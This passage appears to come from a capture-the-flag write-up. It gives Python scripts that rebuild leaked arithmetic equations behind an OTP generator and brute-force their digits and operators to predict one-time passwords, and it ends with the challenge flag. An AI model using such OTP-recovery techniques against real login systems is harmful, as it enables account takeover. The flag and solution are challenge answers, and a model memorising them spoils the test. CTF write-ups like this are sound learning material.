cc = 0
oc = 0
tc = 0

llll = []
for i in orderr:
    name = i[0][len(dummy_pref):]
    if name == "x":
        name +=str(oc)
        oc += 1
    elif name == "xx":
        name +=str(tc)
        tc += 1
    if c % 3  == 0:
        l =""
        l += name
    elif c % 3 == 1:
        if name in ops:
            l += " " + name + " "
            used += [name]
        else:
            s = ""
            for i in used:
                s += i + "/"
            l += " " + s + " " + name
            c += 1
        
    else:
        l += name
    c += 1
    c = c % 3
    if c == 0:
        num_line = l +  f" = r{cc}"
        llll += [num_line]
        print(num_line)
        cc += 1

print(llll)
```

will output something like this

```
['152 div x0 = r0', 'r0 plus 1007 = r1', 'r1 minus xx0 = r2', 'xx1 div/plus/minus/ r2 = r3', 'x1 mul r3 = r4', 'x2 div/plus/minus/mul/ r4 = r5']
```

where x0, x1, x2 represent the 1 digit numbers and xx0, xx1 represent the 2 digit numbers. Since I could not find away to specify them. Also I was unable to make the operators to resend a request due to caching. 

But it was fine since we can bruteforce multiple values of r5 as the strict maximum possibilities of r5, if im not wrong, is (3!) * (2!) * (3**3) = 334 and that still include values of r5 which are negative and not-natural. So with multiple sets of equations we are very likely to be able to find a r5 that are in all of them. 

So we can change the dummypref and receive another equation

```
['x0 plus 1007 = r0', 'xx0 mul r0 = r1', 'r1 div x1 = r2', 'r2 plus/mul/div/ x2 = r3', '152 plus/mul/div/ r3 = r4', 'r4 minus xx1 = r5']
```

I then made another python script that takes in two lists of equations, generate two list of possible values of r5 and finds the common element(s) and prints an order of operations needed to get the them. 

```python
from itertools import permutations

def bf(li):
    x = [1, 2, 4]
    xx = [11, 34]
    results = []
    roop = {}
    ops = ["plus", "minus", "mul", "div"]
    known_op =[]
    ops_pos = [[]]
    for l in li:
        op = l.split(" ")[1]
        if op in ops:
            known_op.append(op)
            for i in ops_pos:
                i.append(op)
        else:
            new_pos = []
            for i in known_op:
                for j in ops_pos:
                    k = j.copy()
                    new_pos.append(k + [i])
            ops_pos = new_pos
    def apply(a, b, c):
        if b == "plus":
            return a + c
        elif b == "minus":
            return a - c
        elif b == "mul":
            return a * c
        elif b == "div":
            if a % c != 0:
                return -1
            return a // c
    for i in permutations(x):
        for j in permutations(xx):
            r_list = [0 for i in range(6)]
            cons = [i[0], i[1], i[2], j[0], j[1]]
            def get_num(s):
                if s[0:2] == "xx":
                    return cons[int(s[2]) + 3]
                elif s[0] == "x":
                    return cons[int(s[1])]
                elif s[0] == "r":
                    return r_list[int(s[1])]
                else:
                    return int(s)
            for k in ops_pos:
                # print(k)
                line_count = 0
                oop = []
                while line_count < len(li):
                    line = li[line_count]
                    a, b, c = line.split(" ")[:3]
                    
                    result = apply(get_num(a), k[line_count], get_num(c))
                    oop += [[get_num(a), k[line_count], get_num(c), result]]
                    # print((get_num(a), k[line_count], get_num(c),result))
                    if result <= 0:
                        break
                    r_list[line_count] = result
                    line_count += 1
                if line_count == len(li):
                    roop[result] = oop
                    results.append(result)
                # print("\n")
    rr = sorted(set(results))
    return rr, roop

def common(a, b):
    a = bf(a)
    b = bf(b)
    for i in a[0]:
        if i in b[0]:
            print(a[1][i])

list_1 = ['152 div x0 = r0', 'r0 plus 1007 = r1', 'r1 minus xx0 = r2', 'xx1 div/plus/minus/ r2 = r3', 'x1 mul r3 = r4', 'x2 div/plus/minus/mul/ r4 = r5']
list_2 = ['x0 plus 1007 = r0', 'xx0 mul r0 = r1', 'r1 div x1 = r2', 'r2 plus/mul/div/ x2 = r3', '152 plus/mul/div/ r3 = r4', 'r4 minus xx1 = r5']

common(list_1, list_2)
```

this gives us

```python
[[152, 'div', 2, 76], [76, 'plus', 1007, 1083], [1083, 'minus', 11, 1072], [34, 'plus', 1072, 1106], [4, 'mul', 1106, 4424], [1, 'plus', 4424, 4425]]
```

And we are now able to get OTPs, no we just do this twice and then...

<img width="1077" height="728" alt="image" src="https://github.com/user-attachments/assets/65aa886c-1964-4b90-a80f-875a494b2e39" />

FLAG: TISC{1t_w45_7h3_f1r57_g00gl3_r35ul7_f0r_c55_54n171z3r}
